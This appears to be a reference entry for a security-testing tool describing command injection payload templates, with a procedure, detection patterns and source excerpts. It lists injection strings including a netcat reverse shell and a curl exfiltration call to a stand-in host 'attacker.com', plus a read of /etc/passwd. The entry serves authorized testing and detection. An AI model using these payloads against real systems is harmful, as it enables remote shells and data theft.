# Command Injection Payload Templates

## Overview
- Purpose: Provide reusable command injection payloads for server-side execution testing.
- Category: web_security
- Severity: info
- Tags: command-injection, payloads, web_security

## Context and Use-Cases
- Testing parameters that flow into shell commands.

## Key Parameters and Inputs
- attack_type (string): "cmd_injection"
- complexity (string): one of [basic, advanced]

## Procedure
1. Start with simple separators and harmless commands.
2. Escalate to file reads or exfiltration (as safe/legal).

## Examples
- Payloads:
```
; whoami
| nc -e /bin/bash attacker.com 4444
&& curl http://attacker.com/$(whoami)
```

## Indicators / Detection
- Patterns: `;`, `&&`, backticks, `nc -e`, `curl http://` in user inputs.

## Limitations and Caveats
- Risk classification is keyword-based.

## Source Excerpts
- [S1] "cmd_injection": { "basic": ["; whoami", "| whoami", "& whoami", "`whoami`"], "advanced": ["; cat /etc/passwd", "| nc -e /bin/bash attacker.com 4444", ...] }

## References
-
